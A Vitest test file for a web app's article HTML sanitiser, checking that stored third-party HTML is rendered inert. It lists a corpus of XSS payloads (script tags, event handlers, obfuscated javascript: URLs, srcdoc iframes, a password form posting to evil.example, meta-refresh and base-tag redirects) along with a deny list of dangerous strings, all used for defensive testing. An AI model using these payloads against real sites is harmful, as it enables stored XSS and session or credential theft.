import { describe, expect, it } from "vitest";

import { sanitiseArticleHtml } from "@/lib/sanitize";

/**
 * The corpus that must not survive.
 *
 * This is not a formatting step. We store HTML that a stranger wrote and later
 * render it into our own origin, so anything that gets through here is stored
 * XSS against every reader of that item — including, on the reading view, the
 * only person whose session is worth stealing. ARCHITECTURE.md section 6 step 5
 * is the specification; this file is the proof.
 */

/** Anything in here means script ran, or could be made to. */
function expectInert(dirty: string) {
  const clean = sanitiseArticleHtml(dirty);
  const lower = clean.toLowerCase();

  expect(lower).not.toContain("<script");
  expect(lower).not.toContain("<iframe");
  expect(lower).not.toContain("<object");
  expect(lower).not.toContain("<embed");
  expect(lower).not.toContain("<form");
  expect(lower).not.toContain("<svg");
  expect(lower).not.toContain("<style");
  expect(lower).not.toContain("<base");
  expect(lower).not.toContain("<link");
  expect(lower).not.toContain("<meta");
  expect(lower).not.toContain("javascript:");
  expect(lower).not.toContain("data:text/html");
  expect(lower).not.toContain("expression(");
  expect(lower).not.toMatch(/\son[a-z]+\s*=/);
  expect(lower).not.toContain("style=");
  expect(lower).not.toContain("srcdoc");

  return clean;
}

describe("the XSS corpus", () => {
  it.each([
    ["a script element", "<p>before</p><script>alert(1)</script><p>after</p>"],
    ["an onerror handler", '<img src="x" onerror="alert(1)">'],
    ["an onload handler", '<body onload="alert(1)"><p>hi</p></body>'],
    ["a javascript: href", '<a href="javascript:alert(1)">click</a>'],
    [
      "a javascript: href with leading whitespace",
      '<a href="  javascript:alert(1)">click</a>',
    ],
    [
      "a javascript: href in mixed case",
      '<a href="JaVaScRiPt:alert(1)">click</a>',
    ],
    [
      "a javascript: href hidden in entities",
      '<a href="java&#115;cript:alert(1)">click</a>',
    ],
    [
      "a data:text/html href",
      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
    ],
    ["an iframe", '<iframe src="https://evil.example/"></iframe>'],
    ["an iframe with srcdoc", '<iframe srcdoc="<script>alert(1)</script>">'],
    ["an svg with onload", '<svg onload="alert(1)"><circle r="10"/></svg>'],
    [
      "a form posting somewhere",
      '<form action="https://evil.example/"><input name="password"><button>Go</button></form>',
    ],
    [
      "a style attribute with expression()",
      '<p style="width: expression(alert(1))">text</p>',
    ],
    [
      "a style element",
      "<style>body { background: url(javascript:alert(1)) }</style><p>hi</p>",
    ],
    ["an object", '<object data="https://evil.example/x.swf"></object>'],
    ["an embed", '<embed src="https://evil.example/x.swf">'],
    [
      "a base tag that rewrites every relative link",
      '<base href="https://evil.example/">',
    ],
    [
      "a meta refresh",
      '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
    ],
    [
      "a stylesheet link",
      '<link rel="stylesheet" href="https://evil.example/x.css">',
    ],
    [
      "a nested tag that survives one naive pass",
      "<scr<script>ipt>alert(1)</scr</script>ipt>",
    ],
    ["an onmouseover on a paragraph", '<p onmouseover="alert(1)">hover</p>'],
    ["a noscript wrapper", "<noscript><p>fallback</p></noscript>"],
    ["a template element", "<template><script>alert(1)</script></template>"],
    ["a math element", "<math><mtext><script>alert(1)</script></mtext></math>"],
    [
      "an image with a data: URL source",
      '<img src="data:text/html,<script>alert(1)</script>">',
    ],
  ])("neutralises %s", (_label, dirty) => {
    expectInert(dirty);
  });

  it("discards the contents of a script, not just its tags", () => {
    // Stripping <script> but keeping its text leaves "alert(1)" as visible
    // prose in the article, which looks like a bug and reads like one.
    const clean = sanitiseArticleHtml("<script>alert(1)</script><p>real</p>");
    expect(clean).not.toContain("alert(1)");
    expect(clean).toContain("real");
  });

  it("discards the contents of a form, an iframe and a style", () => {
    const clean = sanitiseArticleHtml(
      "<form><label>Password</label></form>" +
        "<style>.x { color: red }</style>" +
        "<iframe>fallback text</iframe>" +
        "<p>real</p>",
    );

    expect(clean).not.toContain("Password");
    expect(clean).not.toContain("color: red");
    expect(clean).not.toContain("fallback text");
    expect(clean).toContain("real");
  });

  it("keeps the prose around what it removes", () => {
    const clean = sanitiseArticleHtml(
      "<p>Before.</p><script>alert(1)</script><p>After.</p>",
    );
    expect(clean).toContain("Before.");
    expect(clean).toContain("After.");
  });
});

describe("what survives", () => {
  it("keeps the tags an article is actually made of", () => {
    const article =
      "<h1>Title</h1><h2>Section</h2><p>A <strong>bold</strong> and " +
      "<em>italic</em> sentence with <code>code</code>.</p>" +
      "<blockquote><p>Quoted.</p></blockquote>" +
      "<ul><li>One</li><li>Two</li></ul>" +
      "<ol><li>First</li></ol>" +
      "<pre><code>const x = 1;</code></pre>" +
      '<figure><img src="https://cdn.example/a.jpg" alt="A photo">' +
      "<figcaption>Caption</figcaption></figure>" +
      "<table><thead><tr><th>H</th></tr></thead>" +
      "<tbody><tr><td>C</td></tr></tbody></table>" +
      "<hr>";

    const clean = sanitiseArticleHtml(article);

    for (const tag of [
      "<h1>",
      "<h2>",
      "<p>",
      "<strong>",
      "<em>",
      "<code>",
      "<blockquote>",
      "<ul>",
      "<li>",
      "<ol>",
      "<pre>",
      "<figure>",
      "<figcaption>",
      "<table>",
      "<thead>",
      "<th>",
      "<td>",
      "<hr",
    ]) {
      expect(clean).toContain(tag);
    }
  });

  it("keeps an http and an https link", () => {
    const clean = sanitiseArticleHtml(
      '<a href="https://example.com/a">secure</a>' +
        '<a href="http://example.com/b">plain</a>',
    );
    expect(clean).toContain('href="https://example.com/a"');
    expect(clean).toContain('href="http://example.com/b"');
  });

  it("keeps an image source and its alt text", () => {
    const clean = sanitiseArticleHtml(
      '<img src="https://cdn.example/a.jpg" alt="A kingfisher">',
    );
    expect(clean).toContain('src="https://cdn.example/a.jpg"');
    expect(clean).toContain('alt="A kingfisher"');
  });

  it("drops a protocol-relative URL", () => {
    // "//evil.example/x" inherits our scheme and reads as same-origin to a
    // casual glance. Extraction absolutises every URL before we get here, so
    // one that is still relative did not come from the document we fetched.
    const clean = sanitiseArticleHtml('<a href="//evil.example/x">x</a>');
    expect(clean).not.toContain("evil.example");
  });

  it("drops a relative URL", () => {
    const clean = sanitiseArticleHtml('<a href="/local/path">x</a>');
    expect(clean).not.toContain("/local/path");
  });

  it("drops class names", () => {
    // An article that can set class names can collide with the reading view's
    // own styles, or imitate our chrome.
    const clean = sanitiseArticleHtml('<p class="sign-in-prompt">x</p>');
    expect(clean).not.toContain("class");
  });

  it("keeps table structure attributes", () => {
    const clean = sanitiseArticleHtml(
      '<table><tr><th scope="col" colspan="2">H</th></tr></table>',
    );
    expect(clean).toContain('scope="col"');
    expect(clean).toContain('colspan="2"');
  });

  it("drops HTML comments", () => {
    const clean = sanitiseArticleHtml("<!-- secret --><p>visible</p>");
    expect(clean).not.toContain("secret");
  });
});

describe("outbound links", () => {
  it("forces rel and target on every link", () => {
    const clean = sanitiseArticleHtml('<a href="https://example.com/a">x</a>');
    expect(clean).toContain('rel="noopener noreferrer nofollow"');
    expect(clean).toContain('target="_blank"');
  });

  it("overwrites a rel the author supplied", () => {
    // Trusting the author's rel is trusting the party we are defending
    // against: rel="opener" hands window.opener to the page we linked to.
    const clean = sanitiseArticleHtml(
      '<a href="https://example.com/a" rel="opener" target="_self">x</a>',
    );
    expect(clean).toContain('rel="noopener noreferrer nofollow"');
    expect(clean).toContain('target="_blank"');
    expect(clean).not.toContain('rel="opener"');
    expect(clean).not.toContain('target="_self"');
  });
});

describe("edge cases that must not throw", () => {
  it.each([
    ["an empty string", ""],
    ["only whitespace", "   \n  "],
    ["unclosed tags", "<p>one<div>two<span>three"],
    ["a stray closing tag", "</p>text</div>"],
    [
      "deeply nested markup",
      "<div>".repeat(200) + "deep" + "</div>".repeat(200),
    ],
    ["a bare ampersand", "<p>Marks & Spencer</p>"],
    ["an unterminated attribute", '<a href="https://example.com>text</a>'],
  ])("survives %s", (_label, dirty) => {
    expect(() => sanitiseArticleHtml(dirty)).not.toThrow();
  });
});
